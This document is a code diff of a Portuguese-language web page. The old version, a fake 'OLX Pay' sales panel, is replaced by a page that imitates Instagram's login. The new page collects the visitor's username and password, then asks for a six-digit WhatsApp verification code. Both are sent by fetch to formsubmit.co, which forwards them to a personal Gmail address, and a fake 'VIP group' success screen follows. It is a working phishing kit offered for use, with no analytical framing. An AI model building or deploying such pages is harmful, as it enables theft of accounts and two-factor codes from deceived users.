@@ -1,196 +1,150 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Painel de Vendas - OLX Pay</title>
-  <link rel="icon" href="https://static.olx.com.br/static/olxbr/favicon-32x32.png" type="image/png">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 30px;
-      max-width: 900px;
+      background-color: #fafafa;
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border: 1px solid #ddd;
+      text-align: center;
+      width: 100%;
+      max-width: 320px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
       margin: auto;
     }
+
     .logo {
-      text-align: center;
-      margin-bottom: 20px;
+      width: 120px;
+      margin-bottom: 25px;
     }
-    .logo img {
-      width: 150px;
-    }
-    h2 {
-      text-align: center;
-      color: #ff6600;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 30px;
-      background: #fff;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-    }
-    th, td {
-      padding: 15px;
-      text-align: left;
-      border-bottom: 1px solid #eee;
-    }
-    th {
-      background-color: #ff6600;
-      color: white;
-    }
-    .status {
-      font-weight: bold;
-    }
-    .status.aprovado { color: green; }
-    .status.pendente { color: orange; }
-    .status.cancelado { color: red; }
-    .formulario {
-      margin-top: 30px;
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 5px rgba(0,0,0,0.1);
-    }
-    .formulario input, .formulario select {
+
+    input, button {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
-    }
-    .formulario button {
-      background-color: #ff6600;
-      color: white;
-      padding: 12px;
-      border: none;
-      width: 100%;
-      cursor: pointer;
+      margin: 8px 0;
+      border: 1px solid #ccc;
       border-radius: 5px;
-      margin-top: 10px;
+      font-size: 14px;
+      box-sizing: border-box;
     }
-    .limpar {
-      background-color: #cc0000;
+
+    button {
+      background-color: #3897f0;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+    }
+
+    button:hover {
+      background-color: #318bda;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #999;
+      margin-top: 15px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .loading img {
+      width: 40px;
+      margin-bottom: 10px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-
-  <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/OLX_New_Logo.svg/2560px-OLX_New_Logo.svg.png" alt="OLX Logo">
+  <div class="container" id="login">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
+      <input type="password" name="password" placeholder="Senha" required />
+      <button type="submit">Entrar</button>
+    </form>
+    <div class="footer">© 2025 Instagram from Meta</div>
   </div>
 
-  <h2>Painel de Vendas - OLX Pay</h2>
+  <div class="container hidden" id="codigo">
+    <h3>Verificação de segurança</h3>
+    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
+    <form id="codigoForm">
+      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
+      <button type="submit">Confirmar</button>
+    </form>
+  </div>
 
-  <table id="tabela-vendas">
-    <thead>
-      <tr>
-        <th>Produto</th>
-        <th>Valor</th>
-        <th>Comprador</th>
-        <th>Status</th>
-        <th>Código de Postagem</th>
-      </tr>
-    </thead>
-    <tbody>
-      <!-- Vendas aparecem aqui -->
-    </tbody>
-  </table>
+  <div class="container hidden" id="carregando">
+    <div class="loading">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
+      <p>Verificando código...</p>
+    </div>
+  </div>
 
-  <div class="formulario">
-    <h3>Adicionar nova venda</h3>
-    <input type="text" id="produto" placeholder="Nome do produto" required>
-    <input type="text" id="valor" placeholder="Valor (ex: R$ 1000,00)" required>
-    <input type="email" id="comprador" placeholder="Email do comprador" required>
-    <select id="status">
-      <option value="aprovado">Aprovado</option>
-      <option value="pendente">Pendente</option>
-      <option value="cancelado">Cancelado</option>
-    </select>
-    <input type="text" id="codigo" placeholder="Código de postagem (opcional)">
-    <button onclick="adicionarVenda()">Adicionar</button>
-    <button onclick="limparTudo()" class="limpar">Limpar todas as vendas</button>
+  <div class="container hidden" id="final">
+    <h2>Parabéns!</h2>
+    <p>Cadastro realizado com sucesso.</p>
+    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
   </div>
 
   <script>
-    let vendas = [];
+    const loginForm = document.getElementById("loginForm");
+    const codigoForm = document.getElementById("codigoForm");
 
-    window.onload = function () {
-      const dadosSalvos = localStorage.getItem('vendas');
-      if (dadosSalvos) {
-        vendas = JSON.parse(dadosSalvos);
-        vendas.forEach(venda => exibirVendaNaTabela(venda));
-      }
-    }
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("login").classList.add("hidden");
+      document.getElementById("codigo").classList.remove("hidden");
 
-    function adicionarVenda() {
-      const produto = document.getElementById('produto').value.trim();
-      const valor = document.getElementById('valor').value.trim();
-      const comprador = document.getElementById('comprador').value.trim();
-      const status = document.getElementById('status').value;
-      const codigo = document.getElementById('codigo').value.trim() || '-';
-
-      if (!produto || !valor || !comprador) {
-        alert('Preencha todos os campos obrigatórios!');
-        return;
-      }
-
-      const novaVenda = { produto, valor, comprador, status, codigo };
-      vendas.push(novaVenda);
-      localStorage.setItem('vendas', JSON.stringify(vendas));
-      exibirVendaNaTabela(novaVenda);
-      limparFormulario();
-
-      // Enviar dados para o e-mail com campos organizados
-      const dadosParaEnviar = new FormData();
-      dadosParaEnviar.append('Nova venda cadastrada:', '--------------------------');
-      dadosParaEnviar.append('Produto', produto);
-      dadosParaEnviar.append('Valor', valor);
-      dadosParaEnviar.append('Comprador (e-mail)', comprador);
-      dadosParaEnviar.append('Status da Venda', status);
-      dadosParaEnviar.append('Código de Postagem', codigo);
-
+      const dados = new FormData(loginForm);
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Accept': 'application/json' },
-        body: dadosParaEnviar,
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log("Email enviado:", data);
-      })
-      .catch(error => {
-        console.error("Erro ao enviar email:", error);
+        body: dados
       });
-    }
+    });
 
-    function exibirVendaNaTabela(venda) {
-      const tbody = document.querySelector('#tabela-vendas tbody');
-      const tr = document.createElement('tr');
-      tr.innerHTML = `
-        <td>${venda.produto}</td>
-        <td>${venda.valor}</td>
-        <td>${venda.comprador}</td>
-        <td class="status ${venda.status}">${venda.status.charAt(0).toUpperCase() + venda.status.slice(1)}</td>
-        <td>${venda.codigo}</td>
-      `;
-      tbody.appendChild(tr);
-    }
+    codigoForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("codigo").classList.add("hidden");
+      document.getElementById("carregando").classList.remove("hidden");
 
-    function limparFormulario() {
-      document.getElementById('produto').value = '';
-      document.getElementById('valor').value = '';
-      document.getElementById('comprador').value = '';
-      document.getElementById('status').value = 'aprovado';
-      document.getElementById('codigo').value = '';
-    }
+      const dadosCodigo = new FormData(codigoForm);
+      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        headers: { 'Accept': 'application/json' },
+        body: dadosCodigo
+      });
 
-    function limparTudo() {
-      if (confirm("Tem certeza que deseja apagar todas as vendas?")) {
-        vendas = [];
-        localStorage.removeItem('vendas');
-        document.querySelector('#tabela-vendas tbody').innerHTML = '';
-      }
-    }
+      setTimeout(() => {
+        document.getElementById("carregando").classList.add("hidden");
+        document.getElementById("final").classList.remove("hidden");
+      }, 2500);
+    });
   </script>
-
 </body>
 </html>
